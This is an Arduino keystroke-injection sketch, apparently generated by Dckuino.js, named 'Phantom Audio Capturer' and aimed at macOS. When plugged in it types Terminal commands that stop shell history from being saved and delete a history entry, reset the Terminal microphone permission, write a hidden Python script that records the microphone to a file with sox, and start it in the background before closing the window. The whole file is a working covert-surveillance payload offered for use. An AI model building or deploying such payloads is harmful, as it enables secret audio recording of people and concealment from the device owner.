// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // Creates a hidden folder named .phantom_audio in the home directory.
  // Writes a Python script (record.py) that uses the sox utility
  // to record audio from the microphone and save it as a .mp3 file.
  // Once executed, the audio recording will start and continue until manually stopped
  // You can stop the audio recording by finding the PID and using 'kill pid#'
  // The recording is saved in the .phantom_audio directory under the home directory
  // To access the audio file easily, you can use the following steps:
  // Open a new Finder window. Go to the "Go" menu in the menu bar and select "Go to Folder"
  // enter "~/.phantom_audio" and click the "Go" button.
  // navigate to the .phantom_audio folder where you can find the "Secret audio.mp3" file.
  // To delete the hidden folder use command 'rm -r ~/.phantom_audio'
  // Requirements: SOX you can install through homebrew 'brew install sox'
  // Author: Narsty
  // Title: Phantom Audio Capturer
  // Target: MacOS
  // Version: 1.0
  // Category: Recon
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("Terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo -e \"export HISTCONTROL=ignorespace\\nunset HISTFILE\" >> ~/.bashrc && source ~/.bashrc && exec bash");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print(" screen -dm bash -c \"nohup python3 record.py &\"");

  delay(200);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" tccutil reset Microphone com.apple.Terminal");

  delay(500);

  typeKey(KEY_RETURN);

  Keyboard.print(" mkdir -p ~/.phantom_audio && cd ~/.phantom_audio");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" echo 'import os\\nimport subprocess\\nimport datetime\\n\\nfilename = \"Secret audio.mp3\"\\ncmd = f\"sox -d -C 128 -r 44100 \\\"{filename}\\\"\"\\nsubprocess.Popen(cmd, shell=True)' > record.py");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(" nohup python3 record.py &");

  typeKey(KEY_RETURN);

  delay(250);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}